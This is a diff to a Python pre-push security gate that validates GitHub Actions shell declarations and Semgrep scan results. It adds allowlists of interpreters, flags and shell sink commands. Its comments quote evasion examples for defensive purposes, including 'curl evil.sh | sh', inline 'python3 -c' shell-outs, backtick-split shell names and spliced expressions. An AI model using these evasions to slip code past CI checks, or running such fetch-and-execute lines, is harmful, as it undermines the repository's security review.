@@ -10,6 +10,7 @@ import difflib
 import json
 import os
 import re
+import shlex
 import shutil
 import subprocess
 import sys
@@ -23,7 +24,7 @@ from datetime import UTC, datetime
 from fnmatch import fnmatch
 from functools import lru_cache
 from pathlib import Path, PurePosixPath
-from typing import TextIO, cast
+from typing import NamedTuple, TextIO, cast
 
 _PROJECT_ROOT = Path(__file__).resolve().parents[2]
 _VALIDATION_PACKAGE_SENTINEL = _PROJECT_ROOT / "scripts" / "validation" / "models.py"
@@ -55,7 +56,6 @@ ADR_REVIEW_PATH_RE = re.compile(
     re.IGNORECASE,
 )
 ADR_ID_RE = re.compile(r"ADR-\d+", re.IGNORECASE)
-PATH_SEPARATOR_RE = re.compile(r"[\\/]")
 FRONTMATTER_FIELD_RE = re.compile(r"^([A-Za-z0-9_-]+):(.*)$")
 ADR_REVIEW_PATTERNS = (
     re.compile(r"/adr-review"),
@@ -123,52 +123,57 @@ SEMGREP_PARTIAL_RULE_RE = re.compile(
 # template syntax, which the runner substitutes before any shell sees it.
 # Semgrep reports both as warn-level errors. Tolerate only those two shapes;
 # every other scan error still blocks the push.
-# The lookahead is load-bearing. With a plain `\b`, `python-shim` matches on its
-# `python` prefix, because a hyphen ends a word. Requiring whitespace or end of
-# string makes the interpreter token exact.
-# Only tolerate interpreters this repository actually declares. The four values
-# in use are `bash`, `pwsh`, `pwsh -NoProfile -Command "& '{0}'"`, and
-# `python3 {0}`, so `cmd`, `node`, `ruby`, and `perl` are speculative surface
-# with real teeth: `cmd` glues its command to the switch, so `/cbash` is a valid
-# flag shape that runs Bash, and `perl` execs the interpreter named in a `#!`
-# line, so the body itself can redirect execution into Bash no matter what this
-# value says. An unlisted interpreter is not tolerated, which blocks the push
-# rather than allowing it.
+# Classification is an allowlist of interpreter tokens and argument shapes, not a
+# blocklist of shell names. #3683 demonstrated that every name-based blocklist is
+# defeatable: `python3 -c "import os;os.system(...)" {0}` reaches `/bin/sh`
+# without spelling a shell, ``pwsh -c "bas`h {0}"`` splits the name with a
+# backtick, and `cmd /cbash {0}` glues it into a token that `\b` cannot see.
 #
-# The `.exe` suffix is deliberately absent. The runner names the temp script by
-# looking the first token up in its own extension table, whose keys are exactly
-# `cmd`, `pwsh`, `powershell`, `bash`, `sh`, and `python`. `pwsh` resolves to
-# `.ps1`, which PowerShell parses as PowerShell, but `pwsh.exe` misses the table
-# and yields a file with no extension, which PowerShell hands to the OS instead
-# of parsing. That turns a `#!/bin/bash` body into a Bash execution under a
-# PowerShell `shell:` value. No workflow here uses an `.exe` form, and the
-# runner rejects a bare `pwsh.exe` without a `{0}`, so nothing is lost by
-# refusing it. Refs #3663.
+# The interpreter token must be exact and lowercase. The Actions runner names the
+# step's temp script by looking the FIRST token of `shell:` up in a six-key
+# extension table (cmd, pwsh, powershell, bash, sh, python); a miss writes the
+# file with no extension. PowerShell's call operator hands an extensionless file
+# to the OS, which honours a `#!/bin/bash` first line, so `pwsh.exe -Command "&
+# '{0}'"` runs Bash while declaring PowerShell. The `(?:\.exe)?` suffix this
+# classification used to accept was itself the bypass, so it is gone.
 #
-# The tolerated set is exactly what `.github/workflows/` declares: 38 `pwsh`,
-# 29 `bash`, 2 `python3`. This regex gates an exemption, not a warning, so a
-# name nothing declares is exempt surface bought for nothing. `python3?` also
-# matched bare `python`, a valid Actions keyword that no step here uses.
-# Narrowing to `python3` is fail-closed: an undeclared shell now gets
-# Bash-scanned instead of skipped. Widening it again needs a workflow to cite.
-NON_BASH_SHELL_RE = re.compile(
-    r"^\s*(?:pwsh|powershell|python3)(?=\s|$)",
-    re.IGNORECASE,
-)
-# A `shell:` value naming a second interpreter cannot be trusted to describe what
-# actually runs the script. `pwsh -NoProfile -Command "& '{0}'"` is the idiomatic
-# form and names only pwsh, while `python3 -c "...os.system('bash ' + argv[1])"`
-# declares Python and executes Bash. Refuse to classify the latter as non-Bash.
-FOREIGN_SHELL_REFERENCE_RE = re.compile(r"\b(?:bash|sh|zsh|dash|ksh|ash)\b", re.IGNORECASE)
-# A custom shell template is attacker-controlled and may reach a POSIX shell
-# without ever naming one: `python3 -c "import os,sys;os.system(...)" {0}` runs
-# the body through `/bin/sh` while spelling neither `sh` nor `bash`. Scanning
-# the remainder for shell names is therefore a blocklist and is trivially
-# evaded, so the control is an allowlist: after the interpreter, the only
-# tokens permitted are flags, the `{0}` placeholder, and the PowerShell call
-# operator. Anything that can carry an inline program fails the check and the
-# step is not tolerated. Refs #3663.
-SHELL_FLAG_RE = re.compile(r"^-{1,2}[A-Za-z][A-Za-z0-9-]*$")
+# `perl` is absent deliberately: per `man perlrun`, perl execs the interpreter
+# named in a `#!` line that does not contain "perl", so `perl {0}` runs Bash.
+# `node`, `ruby`, and `cmd` are absent because this repository uses none of them
+# and every entry widens the surface. A push using one blocks, which is the
+# correct direction for a security gate.
+#
+# Bare `python` is absent for the same reason: it is a valid Actions keyword,
+# but the declared shells here are 28 `bash`, 33 `pwsh`, and 2 `python3 {0}`,
+# so exempting `python` buys surface no caller uses. Refs #3683, #3663.
+NON_BASH_INTERPRETERS = frozenset({"pwsh", "powershell", "python3"})
+# Flags an interpreter accepts that provably carry no code of their own, keyed
+# by interpreter. An allowlist, because a flag is an execution vector: a generic
+# "looks like a flag" regex accepted `python3 -mevil {0}`, which runs the
+# attacker's module and ignores the workflow's own script, while the gate
+# treated the step as a reviewed non-Bash interpreter and skipped the Bash
+# rules. Verified against CPython.
+#
+# Python gets no flags at all. Every flag that changes what Python executes
+# (`-c`, `-m`) can be written without a separating space, so no prefix test
+# distinguishes them from the harmless ones; the repository only ever uses the
+# bare `python3 {0}` form, so permitting nothing else costs nothing.
+#
+# PowerShell's flags are matched case-insensitively because pwsh itself accepts
+# them that way. `-Command` is safe to name here only because its argument must
+# still match POWERSHELL_CALL_TOKEN_RE; any other argument text fails closed.
+# Refs #3683.
+SAFE_SHELL_FLAGS: dict[str, frozenset[str]] = {
+    "pwsh": frozenset({"-noprofile", "-nologo", "-noninteractive", "-command"}),
+    "powershell": frozenset({"-noprofile", "-nologo", "-noninteractive", "-command"}),
+    "python3": frozenset(),
+}
+# The script placeholder, bare or quoted.
+SHELL_PLACEHOLDER_TOKEN_RE = re.compile(r"^[\"']?\{0\}[\"']?$")
+# PowerShell's canonical custom-shell template invokes the script through the
+# call operator: `pwsh -NoProfile -Command "& '{0}'"`. Permit exactly that shape.
+# Any other argument text is free to name a second interpreter.
+POWERSHELL_CALL_TOKEN_RE = re.compile(r"^[&.]\s*(?:'\{0\}'|\"\{0\}\"|\{0\})$")
 # A leading `#!` hands interpreter choice to the OS, so the `shell:` value stops
 # describing what runs. The kernel only honours `#!` at byte 0, so the leading
 # whitespace class here is deliberately stricter than it needs to be: it costs
@@ -176,8 +181,80 @@ SHELL_FLAG_RE = re.compile(r"^-{1,2}[A-Za-z][A-Za-z0-9-]*$")
 # the need to reason about who might normalise the body before the kernel sees
 # it. Being stricter fails closed, which blocks a push rather than allowing one.
 SHEBANG_RE = re.compile(r"^[ \t\r\n]*#!")
-SHELL_TEMPLATE_TOKENS = frozenset({"{0}", "&"})
 ACTIONS_EXPRESSION_RE = re.compile(r"\$\{\{.+?\}\}", re.DOTALL)
+# One character standing in for an expression while the body is tokenised. NUL
+# cannot appear in a YAML scalar, so it can never collide with real content.
+EXPRESSION_SENTINEL = "\x00"
+# A word that assigns rather than names a command: `FOO=bar cmd` leaves `cmd` in
+# the command slot, so the assignment must not consume it.
+SHELL_ASSIGNMENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*(?:\[[^]]*\])?\+?=")
+# Reserved words that introduce a command rather than being one. Without these,
+# `if true; then c${{ '' }}url x | sh; fi` reads as though `then` were the
+# command and the spliced word merely its argument.
+SHELL_RESERVED_WORDS = frozenset(
+    {
+        "!", "(", ")", "{", "}", "&&", "||", "|", ";", "&",
+        "case", "do", "done", "elif", "else", "esac", "fi", "for", "if",
+        "in", "select", "then", "time", "until", "while",
+    },
+)
+# Words that open and close a compound command. A compound opened inside a
+# pipeline keeps that pipeline, so `echo payload | while read l; do eval "$l";
+# done` reads as one dataflow rather than two unrelated ones.
+SHELL_COMPOUND_OPENERS = frozenset({"case", "for", "if", "select", "until", "while", "{"})
+SHELL_COMPOUND_CLOSERS = frozenset({"done", "esac", "fi", "}"})
+# Commands that run their arguments, or text piped to them, as code. Reaching
+# one anywhere in the body means argument position no longer separates data
+# from code.
+SHELL_SINK_COMMANDS = frozenset(
+    {
+        ".", "ash", "awk", "bash", "builtin", "busybox", "chroot", "command",
+        "coproc", "dash", "doas", "env", "eval", "exec", "flock", "gawk",
+        "ionice", "ksh", "mawk", "nice", "nohup", "parallel", "rbash",
+        "runuser", "script", "setsid", "sh", "source", "ssh", "stdbuf", "su",
+        "sudo", "taskset", "time", "timeout", "trap", "unbuffer", "watch",
+        "xargs", "zsh",
+    },
+)
+# Interpreters that run a script file by default and only become sinks when an
+# argument hands them code directly. Without the flag test, an ordinary
+# `python3 build.py --tag "v${{ inputs.version }}"` would be refused. The flags
+# are per interpreter: `make -f` reads a makefile as code, but `python3 -f` is
+# not a thing, and treating `-f` as universal would refuse every ordinary
+# `python3 script.py -f config.yml`.
+_INTERPRETER_CODE_FLAGS = frozenset({"-c", "-e", "-", "-E", "--eval", "--command"})
+_FIND_CODE_FLAGS = frozenset({"-exec", "-execdir", "-ok", "-okdir"})
+SHELL_CODE_FLAG_SINKS: dict[str, frozenset[str]] = {
+    "find": _FIND_CODE_FLAGS,
+    "lua": _INTERPRETER_CODE_FLAGS,
+    "make": frozenset({"-f", "--file", "--makefile"}),
+    "node": _INTERPRETER_CODE_FLAGS,
+    "perl": _INTERPRETER_CODE_FLAGS,
+    "php": _INTERPRETER_CODE_FLAGS,
+    "python": _INTERPRETER_CODE_FLAGS,
+    "python2": _INTERPRETER_CODE_FLAGS,
+    "python3": _INTERPRETER_CODE_FLAGS,
+    "ruby": _INTERPRETER_CODE_FLAGS,
+}
+SHELL_CODE_FLAGS = frozenset[str]().union(*SHELL_CODE_FLAG_SINKS.values())
+# A variable reference, so an expression assigned to a name can be followed to
+# the command position that later expands it.
+SHELL_VARIABLE_REFERENCE_RE = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)")
+# A word that is nothing but a variable expansion, in either brace form. The
+# sink-alias lookup has to accept both, because `${SH} -c` reaches the same
+# shell as `$SH -c`.
+SHELL_VARIABLE_WORD_RE = re.compile(r"\$(?:\{([A-Za-z_][A-Za-z0-9_]*)\}|([A-Za-z_][A-Za-z0-9_]*))")
+# Commands whose non-flag arguments name files they write. `tee` does not run
+# what it receives, so it is a writer rather than a sink, but it stages a file
+# a later sink can execute.
+SHELL_FILE_WRITERS = frozenset({"tee"})
+# Semgrep sub-parses a run: body as Bash only for a Bash step, so a PowerShell
+# step that shells out to any of these is invisible to the ruleset. Refs #3684.
+POSIX_SHELLS = frozenset({"ash", "bash", "busybox", "dash", "ksh", "sh", "zsh"})
+POWERSHELL_SHELLS = frozenset({"pwsh", "powershell"})
+POWERSHELL_EXEC_PARAMETERS = frozenset({"start-process", "-filepath", "saps", "invoke-item"})
+POWERSHELL_BLOCK_COMMENT_RE = re.compile(r"<#.*?#>", re.DOTALL)
+POWERSHELL_COMMAND_RESET = ";|\n({}&"
 # `bash -n` parses without executing. A body it accepts is valid shell, so a
 # Semgrep sub-parse failure on it is Semgrep's limitation rather than evidence
 # the step is unscannable. A body it rejects is genuinely malformed, and an
@@ -545,6 +622,21 @@ def _read_head_blob(repo_root: Path, relative_path: str) -> bytes | None:
     return result.stdout
 
 
+def _read_blob_bytes(repo_root: Path, revision: str) -> bytes | None:
+    """Read a blob without letting text mode rewrite it.
+
+    ``_run_git`` decodes with ``errors="replace"`` and universal newlines, so a
+    CRLF copy and an LF copy of the same file come back equal, and two files
+    differing only in undecodable bytes do too. Callers here compare blobs to
+    decide whether a merge carried content, and an equality that lossy hands
+    that decision to whoever stages the lossy copy. Refs #3679.
+    """
+    result = _run_git_bytes(repo_root, ["show", revision])
+    if result.returncode != 0:
+        return None
+    return result.stdout
+
+
 def check_branch(repo_root: Path) -> int:
     result = _run_git(repo_root, ["symbolic-ref", "--quiet", "--short", "HEAD"])
     if result.returncode == 1:
@@ -745,21 +837,6 @@ def _split_frontmatter(content: bytes) -> tuple[bytes, bytes]:
     return b"", content
 
 
-def _decoded_frontmatter(raw: bytes) -> str | None:
-    """Decode frontmatter strictly, or report that it cannot be reasoned about.
-
-    Frontmatter has to become text to be parsed as YAML. Decoding it lossily
-    would let two different field values collide on the replacement character
-    and drop out of the changed-key set, hiding an edit the exemption was never
-    meant to cover. Bytes YAML could not have meant are a reason to run the
-    validator, so this fails closed instead.
-    """
-    try:
-        return raw.decode("utf-8")
-    except UnicodeDecodeError:
-        return None
-
-
 def _has_duplicate_frontmatter_keys(frontmatter: str) -> bool:
     seen: set[str] = set()
     for line in frontmatter.splitlines():
@@ -801,32 +878,6 @@ def _only_implemented_field_changed(
         if old_fields.get(key) != new_fields.get(key)
     }
     return bool(changed) and changed <= {"implemented"}
-
-
-def _frontmatter_pair_for_a_body_unchanged_edit(
-    path: str,
-    repo_root: Path,
-) -> tuple[str, str] | None:
-    """Return HEAD and staged frontmatter for an edit that left the body alone.
-
-    `None` means no exemption is on offer: a blob is missing, either document
-    has no frontmatter, the bodies differ, or a frontmatter holds bytes UTF-8
-    cannot read. Both exemptions ask this same question and differ only in
-    which changed fields they will then accept.
-    """
-    old_blob = _read_head_blob(repo_root, path)
-    new_blob = _read_index_blob(repo_root, path)
-    if old_blob is None or new_blob is None:
-        return None
-    old_frontmatter, old_body = _split_frontmatter(old_blob)
-    new_frontmatter, new_body = _split_frontmatter(new_blob)
-    if not old_frontmatter or not new_frontmatter or old_body != new_body:
-        return None
-    old_text = _decoded_frontmatter(old_frontmatter)
-    new_text = _decoded_frontmatter(new_frontmatter)
-    if old_text is None or new_text is None:
-        return None
-    return old_text, new_text
 
 
 def _is_frontmatter_only_metadata_change(path: str, repo_root: Path) -> bool:
@@ -1049,151 +1100,10 @@ def _head_copy_is_one_main_has_carried(repo_root: Path, path: str) -> bool:
     return head_blob_id in _origin_main_blob_ids(repo_root, path)
 
 
-def _blob_id_at(repo_root: Path, commit: str, path: str) -> str | None:
-    result = _run_git(repo_root, ["rev-parse", f"{commit}:{path}"])
-    if result.returncode != 0:
-        return None
-    return result.stdout.strip() or None
-
-
-def _governed_document_identity(path: str) -> str | None:
-    """Which record `path` holds, or None if this gate does not govern it.
-
-    Scoping a followed history to governed paths does not tell two decision
-    records apart: both are governed. Records written from one template share
-    most of their lines, so git reads a commit that drops one and adds another
-    as a rename of it, and the walk crosses from one decision into the other.
-
-    The number in the filename is what says which decision a path holds. The
-    protocol has no number and stands for itself.
-    """
-    if ADR_PATH_RE.search(path):
-        # Read the number from the final segment, which is where the path test
-        # anchors. Across the whole path the first number wins, so a directory
-        # named for another record would shadow the one the file holds and two
-        # decisions would share one identity.
-        identifier = ADR_ID_RE.search(PATH_SEPARATOR_RE.split(path)[-1])
-        return _normalized_record_number(identifier.group(0)) if identifier else None
-    if SESSION_PROTOCOL_PATH_RE.search(path):
-        return "SESSION-PROTOCOL"
-    return None
-
-
-def _normalized_record_number(identifier: str) -> str:
-    """One record's number, written the one way, so a repad is not a new record.
-
-    This repo renamed `ADR-0003-...` to `ADR-003-...`. Compared as text those
-    are two identities, and the walk stops at the rename between them, which
-    refuses states the record plainly held.
-
-    Only the leading zeros go, and they go as text. Reading the number as an
-    integer instead would fold two records together twice over: `\\d` matches
-    every decimal digit, so a name written in another script is governed too
-    and would take the identity of the ASCII record holding the same value,
-    and a new file would inherit a real record's reviewed history. Stripping
-    zeros anywhere rather than in front would fold `ADR-100` into `ADR-1` the
-    same way. Text stripping leaves both pairs distinct.
-    """
-    prefix, _, number = identifier.upper().partition("-")
-    return f"{prefix}-{number.lstrip('0') or '0'}"
-
-
-def _followed_blob_ids(repo_root: Path, path: str, diff_merges: str) -> set[str]:
-    """Blob ids from one `--follow` traversal of `path` on `origin/main`.
-
-    Reading ids out of the raw diff rather than re-reading the file at each
-    commit is what makes `--follow` useful here: at the older commits the
-    current name does not exist yet.
-
-    `diff_merges` is named rather than left to `-m`, which means
-    `--diff-merges=on` and takes its format from the user's `log.diffMerges`.
-    Set to `combined` or `dense-combined`, a merge prints one `::` record whose
-    fourth field is the first parent's pre-image, so the post-image this reads
-    would be the wrong blob. What this gate accepts is not a readability
-    preference.
-    """
-    result = _run_git_bytes(
-        repo_root,
-        [
-            "log",
-            f"--diff-merges={diff_merges}",
-            # `log.showSignature` prefixes each commit's raw records with the
-            # verification result, and the first field of the stream then
-            # begins with that text rather than the colon a record starts
-            # with. Every record is skipped and the walk reports that main
-            # carried nothing here, which refuses records main did carry, for
-            # whichever developers hold that setting. What this gate accepts
-            # is not a display preference.
-            "--no-show-signature",
-            "--follow",
-            "--format=",
-            "--raw",
-            "--no-abbrev",
-            # Paths arrive raw and NUL-separated. Left to the default, git
-            # quotes any path outside ASCII or carrying a quote, a backslash
-            # or a control character, and the scope test below ends on an
-            # anchor the closing quote defeats, so such an ADR would read as
-            # having no history. It also stops a tab inside a name from
-            # looking like the separator before a second path.
-            "-z",
-            "origin/main",
-            "--",
-            path,
-        ],
-    )
-    if result.returncode != 0:
-        return set()
-    # An unrecognised path carries no identity, so nothing below matches it and
-    # the caller is told main has carried nothing here. That refuses; it cannot
-    # exempt.
-    followed = _governed_document_identity(path)
-    blob_ids: set[str] = set()
-    # Decoded here rather than by the pipe. A text mode read applies universal
-    # newline translation, so a path ending in a carriage return arrives ending
-    # in a newline, and the scope test below anchors with `$`, which matches
-    # before a trailing newline. A path this gate does not govern then reads as
-    # one and its blobs join the carried set, which exempts content that never
-    # sat at a governed path. That is what this read fixes. The error handler
-    # is `surrogateescape` because it round trips and costs nothing, not
-    # because it changes a verdict: identity here is the record's number, so a
-    # byte spent elsewhere in the path reaches no decision either way, and a
-    # mutation to `replace` survives the suite for that reason.
-    fields = result.stdout.decode("utf-8", "surrogateescape").split("\0")
-    index = 0
-    while index < len(fields):
-        record = fields[index]
-        index += 1
-        if not record.startswith(":") or record.startswith("::"):
-            # A `::` record lists one pre-image per parent before the
-            # post-image, so its fourth field is a pre-image and its width
-            # depends on the parent count. Naming the format should keep these
-            # away; skipping them is what keeps that true if one arrives. The
-            # paths that follow one fail this same test and are skipped too.
-            continue
-        metadata = record.split()
-        if len(metadata) < 5:
-            continue
-        # A rename or a copy names a source and then a destination. Every
-        # other status names one path.
-        wanted = 2 if metadata[4][:1] in ("R", "C") else 1
-        paths = fields[index : index + wanted]
-        index += wanted
-        if len(paths) < wanted:
-            break
-        if _governed_document_identity(paths[-1]) != followed:
-            # `--follow` rewrites the path it tracks whenever it scores a drop
-            # and an add as a rename, which is similarity and not provenance.
-            # Crossing into a file this gate does not govern would read that
-            # file's states as states of this record, and they never faced ADR
-            # review; crossing into another record would read a decision
-            # somebody reviewed under a different number as this one. The
-            # post-image belongs to the record's destination path, so that is
-            # the path that has to qualify.
-            continue
-        blob_ids.add(metadata[3])
-    # A deletion names no blob afterwards, and the width of that field follows
-    # the repository's hash.
-    return {blob_id for blob_id in blob_ids if not _is_zero_sha(blob_id)}
+def _blob_id(repo_root: Path, revision: str) -> str | None:
+    result = _run_git(repo_root, ["rev-parse", "--verify", "--quiet", f"{revision}"])
+    identifier = result.stdout.strip()
+    return identifier if result.returncode == 0 and identifier else None
 
 
 def _origin_main_blob_ids(repo_root: Path, path: str) -> set[str]:
@@ -2239,55 +2149,6 @@ def _added_suppression_violations(
     return violations
 
 
-def _pure_scanned_rename_destinations(
-    update: PushUpdate,
-    repo_root: Path,
-) -> set[str] | None:
-    result = _run_git(
-        repo_root,
-        [
-            "diff",
-            *TEXTUAL_DIFF_FLAGS,
-            "--find-renames=100%",
-            "--name-status",
-            "--diff-filter=R",
-            "-z",
-            update.range_spec,
-        ],
-    )
-    if result.returncode != 0:
-        _print_process_output(result)
-        return None
-    return _parse_pure_scanned_rename_destinations(result.stdout)
-
-
-def _parse_pure_scanned_rename_destinations(output: str) -> set[str] | None:
-    records = [record for record in output.split("\0") if record]
-    destinations: set[str] = set()
-    index = 0
-    while index < len(records):
-        status = records[index]
-        if index + 2 >= len(records):
-            print("ERROR: malformed rename status in pushed range", file=sys.stderr)
-            return None
-        source = _safe_relative_path(records[index + 1])
-        destination = _safe_relative_path(records[index + 2])
-        if source is None or destination is None:
-            print("ERROR: unsafe rename path in pushed range", file=sys.stderr)
-            return None
-        if status == "R100" and _is_scanned_suppression_rename(source, destination):
-            destinations.add(destination)
-        index += 3
-    return destinations
-
-
-def _is_scanned_suppression_rename(source: str, destination: str) -> bool:
-    return (
-        Path(source).suffix.lower() in SECURITY_SUPPRESSION_SUFFIXES
-        and Path(destination).suffix.lower() in SECURITY_SUPPRESSION_SUFFIXES
-    )
-
-
 def _suppression_violations_in_diff(head: str, diff_text: str) -> list[str]:
     violations: list[str] = []
     current_path: str | None = None
@@ -2485,7 +2346,162 @@ def _scan_pushed_head(
             return materialized
         result = _run_semgrep_tree(tree, paths, repo_root)
         _print_process_output(result)
-        return result.returncode
+        if result.returncode != 0:
+            return result.returncode
+        return _scan_powershell_shell_outs(tree, paths)
+
+
+def _scan_powershell_shell_outs(tree: Path, paths: Sequence[str]) -> int:
+    """Refuse a PowerShell step that hands work to a POSIX shell.
+
+    Semgrep's ``curl-eval`` and ``gha-curl-pipe-shell`` rules sub-parse a
+    ``run:`` body as Bash. A ``shell: pwsh`` step invoking ``bash -c $payload``
+    produces zero findings and zero errors, so no gate decision can see it while
+    the payload still runs under Bash on the runner. That is a ruleset coverage
+    gap rather than a gate bypass, so it is closed here instead. Refs #3684.
+    """
+    findings: list[tuple[str, str]] = []
+    for path in paths:
+        if PurePosixPath(path).suffix.lower() not in {".yml", ".yaml"}:
+            continue
+        try:
+            text = (tree / path).read_text(encoding="utf-8")
+        except (OSError, UnicodeDecodeError, ValueError):
+            continue
+        for shell, body, _node in _yaml_run_scripts(text):
+            if not _is_powershell_shell(shell):
+                continue
+            findings.extend((path, name) for name in _posix_shell_invocations(body))
+    if not findings:
+        return 0
+    print("Semgrep cannot read a POSIX shell command written inside a PowerShell step.")
+    for path, name in findings:
+        print(f"  {path}: invokes {name}")
+    print(
+        "  Run the POSIX commands from a step with 'shell: bash' so the ruleset "
+        "reads them, or move them into their own bash step."
+    )
+    return 1
+
+
+def _is_powershell_shell(shell: str | None) -> bool:
+    if not shell:
+        return False
+    try:
+        tokens = shlex.split(shell, posix=False)
+    except ValueError:
+        tokens = shell.split()
+    if not tokens:
+        return False
+    name = tokens[0].strip("'\"").replace("\\", "/").rsplit("/", 1)[-1].lower()
+    return name.removesuffix(".exe") in POWERSHELL_SHELLS
+
+
+def _posix_shell_invocations(body: str) -> list[str]:
+    """Return every POSIX shell a PowerShell body runs as a command.
+
+    Parameters bind three ways: ``-FilePath bash``, ``-FilePath: bash``, and
+    ``-FilePath:bash``. The first two leave the operand as its own word, so
+    the ``previous`` check covers them once the trailing colon is stripped;
+    the joined form carries the operand inside the word and is split here.
+    """
+    invocations: list[str] = []
+    previous = ""
+    for word, at_command in _powershell_words(body):
+        parameter, separator, operand = word.strip("'\"").partition(":")
+        if (
+            separator
+            and operand
+            and parameter.lower() in POWERSHELL_EXEC_PARAMETERS
+            and _is_posix_shell_name(operand)
+        ):
+            invocations.append(operand.strip("'\""))
+            previous = word
+            continue
+        executes = (
+            at_command
+            or previous.strip("'\"").rstrip(":").lower() in POWERSHELL_EXEC_PARAMETERS
+        )
+        if executes and _is_posix_shell_name(word):
+            invocations.append(word)
+        previous = word
+    return invocations
+
+
+def _is_posix_shell_name(word: str) -> bool:
+    name = word.strip("'\"").replace("\\", "/").rsplit("/", 1)[-1].lower()
+    return name.removesuffix(".exe") in POSIX_SHELLS
+
+
+def _powershell_words(body: str) -> list[tuple[str, bool]]:
+    """Split a PowerShell body into words, marking those in command position.
+
+    Quoting decides whether text is code or data. A quoted string in command
+    position stays, because PowerShell's call operator runs it; a quoted string
+    anywhere else keeps its ``at_command`` flag clear, so the caller can decide
+    from the preceding token whether it is an argument, a message, or the
+    operand of a parameter that executes it. Without that split, a real
+    workflow comment reading "the bash echo" and a real message reading
+    "install with curl | sh" both read as invocations.
+    """
+    text = POWERSHELL_BLOCK_COMMENT_RE.sub(" ", body)
+    words: list[tuple[str, bool]] = []
+    current: list[str] = []
+    index = 0
+    length = len(text)
+    expecting = True
+    word_expecting = True
+
+    def flush() -> None:
+        nonlocal current, expecting, word_expecting
+        if not current:
+            return
+        words.append(("".join(current), word_expecting))
+        current = []
+        expecting = False
+
+    def start_word() -> None:
+        nonlocal word_expecting
+        if not current:
+            word_expecting = expecting
+
+    while index < length:
+        character = text[index]
+        if character == "`" and index + 1 < length:
+            # Backtick is PowerShell's escape character, so ``ba`sh`` is ``bash``.
+            start_word()
+            current.append(text[index + 1])
+            index += 2
+            continue
+        if character in "'\"":
+            start_word()
+            end = text.find(character, index + 1)
+            end = length if end == -1 else end + 1
+            current.append(text[index + 1 : end - 1])
+            index = end
+            continue
+        if character == "#":
+            end = text.find("\n", index)
+            index = length if end == -1 else end
+            continue
+        if character in POWERSHELL_COMMAND_RESET:
+            flush()
+            expecting = True
+            index += 1
+            continue
+        if character.isspace():
+            flush()
+            index += 1
+            continue
+        if character == "." and not current and expecting:
+            # A leading dot is the dot-source operator, so the command follows it.
+            index += 1
+            continue
+        start_word()
+        current.append(character)
+        index += 1
+    flush()
+    return words
 
 
 def _materialize_commit_tree(
@@ -2712,7 +2728,8 @@ def _is_tolerated_semgrep_parse_error(
     if target not in targets:
         return False
     try:
-        content = target.read_text(encoding="utf-8")
+        raw = target.read_bytes()
+        content = raw.decode("utf-8")
     except (OSError, UnicodeError):
         return False
     scripts = _yaml_run_scripts(content)
@@ -2723,7 +2740,7 @@ def _is_tolerated_semgrep_parse_error(
         and SEMGREP_POWERSHELL_ERROR_MARKER in message
     ):
         return _message_matches_unparseable_run(message, scripts)
-    spans = _powershell_partial_parsing_spans(error, message, target, repo_root)
+    spans = _powershell_partial_parsing_spans(error, message, target, repo_root, raw)
     return bool(spans) and all(_span_belongs_to_unparseable_step(scripts, span) for span in spans)
 
 
@@ -2781,7 +2798,11 @@ def _semgrep_snippet_matches_run(
     truncated: bool,
 ) -> bool:
     snippet_lines = snippet.splitlines()
-    run_lines = run.splitlines()
+    # Strip both sides. The snippet arrives stripped; leaving the body unstripped
+    # made a `|+` block scalar's trailing blank lines inflate its line count so
+    # the body failed to match its own snippet, which excluded the real step from
+    # the tolerated list and left only a decoy. Refs #3673.
+    run_lines = run.strip().splitlines()
     if not snippet_lines or len(snippet_lines) > len(run_lines):
         return False
     complete_lines = snippet_lines[:-1] if truncated else snippet_lines
@@ -2824,6 +2845,27 @@ def _semgrep_line_matches_pattern(
     *,
     allow_expected_suffix: bool,
 ) -> bool:
+    # A non-ASCII character in `expected` acts as a wildcard because Semgrep
+    # re-encodes them in its error text. A line made entirely of non-ASCII is
+    # therefore all wildcard and matches any observed line of the same shape,
+    # which let an all-non-ASCII decoy step claim an unrelated snippet. Require
+    # at least one ASCII anchor.
+    #
+    # Whitespace does not count as an anchor. Spaces are ASCII, so an earlier
+    # `isascii` test let `'\u2713 \u2713 \u2713'` satisfy the guard and then
+    # match `'curl evil.sh | sh'`: every non-ASCII run is a wildcard and the
+    # spaces align with the spaces in any ordinary command line. Only a
+    # printable, non-space ASCII character carries enough signal to tie the
+    # expected line to a specific snippet.
+    #
+    # Scoped to lines that actually carry a wildcard. A line of pure ASCII has
+    # none, so it matches exactly and needs no anchor; demanding one there would
+    # reject the blank interior line of an ordinary `run:` block. Refs #3673.
+    if any(not character.isascii() for character in expected) and not any(
+        character.isascii() and character.isprintable() and not character.isspace()
+        for character in expected
+    ):
+        return False
     observed_index = 0
     expected_index = 0
     wildcard_expected_index: int | None = None
@@ -2854,33 +2896,46 @@ def _semgrep_line_matches_pattern(
     return expected_index == len(expected)
 
 
-def _remainder_is_inert_tokens_only(remainder: str) -> bool:
-    """Report whether every token after the interpreter is inert.
+def _is_reviewed_shell_argument(token: str, interpreter: str) -> bool:
+    """Report whether ``token`` is safe to pass to ``interpreter``.
 
-    Inert means a flag, the `{0}` script placeholder, or the PowerShell call
-    operator. A token that is none of those can carry an inline program, and an
-    inline program can reach a POSIX shell without naming one.
+    Safe means the token cannot itself name code to run. A flag qualifies only
+    when the interpreter's own allowlist names it, because a flag such as
+    ``-mevil`` or ``-c`` carries a payload while still looking like a flag.
     """
-    for token in remainder.split():
-        candidate = token.strip("\"'")
-        if not candidate or candidate in SHELL_TEMPLATE_TOKENS:
-            continue
-        if SHELL_FLAG_RE.match(candidate):
-            continue
+    if token.lower() in SAFE_SHELL_FLAGS.get(interpreter, frozenset()):
+        return True
+    if SHELL_PLACEHOLDER_TOKEN_RE.match(token):
+        return True
+    if interpreter not in POWERSHELL_SHELLS:
+        # ``&`` and ``.`` are PowerShell's call operators. Under any other
+        # interpreter they are ordinary argument text, so reading them as a
+        # reviewed invocation grants the exemption on a syntax the named
+        # interpreter does not have.
         return False
-    return True
+    return bool(POWERSHELL_CALL_TOKEN_RE.match(token))
 
 
 def _is_non_bash_shell(shell: str | None) -> bool:
+    """Report whether ``shell`` provably hands the step to a non-Bash interpreter.
+
+    Allowlist, not blocklist: the token must be an exact interpreter name and
+    every remaining token must be a placeholder or a flag that interpreter is
+    known to accept without carrying code. Anything else, including unbalanced
+    quoting, fails closed. Refs #3683.
+    """
     if shell is None:
         return False
-    match = NON_BASH_SHELL_RE.match(shell)
-    if match is None:
+    try:
+        tokens = shlex.split(shell)
+    except ValueError:
         return False
